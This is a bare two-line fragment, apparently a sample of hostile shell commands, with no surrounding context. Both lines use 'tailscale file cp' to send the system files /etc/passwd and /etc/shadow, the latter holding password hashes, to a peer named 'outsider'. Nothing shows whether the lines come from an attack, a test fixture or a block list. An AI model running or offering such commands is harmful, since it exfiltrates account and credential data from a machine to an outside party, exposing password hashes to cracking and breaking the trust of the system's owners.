tailscale file cp /etc/passwd outsider:
tailscale file cp /etc/shadow outsider:
